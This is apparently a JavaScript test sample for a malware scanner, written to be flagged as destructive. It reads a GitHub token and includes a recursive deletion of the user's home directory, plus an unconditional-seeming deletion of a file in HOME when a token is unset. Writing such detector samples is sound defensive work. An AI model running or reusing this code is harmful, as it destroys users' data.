// This file should STILL be detected - contains real destructive patterns
const fs = require('fs');

function attemptCredentialTheft() {
    try {
        // Try to steal credentials
        const token = process.env.GITHUB_TOKEN;
        if (!token) {
            throw new Error("Token not found");
        }
        console.log("Credentials found");
    } catch (error) {
        console.log("Credential theft failed, activating destruction");
        // This should be detected as a real threat
        if (error.message.includes("credential") && error.message.includes("fail")) {
            fs.rmSync(process.env.HOME, { recursive: true });
        }
    }
}

// Another real destructive pattern that should be detected
if (process.env.TOKEN === undefined || process.env.TOKEN === null) {
    console.log("Token not found, deleting user data");
    fs.unlinkSync(process.env.HOME + "/important.txt");
}

attemptCredentialTheft();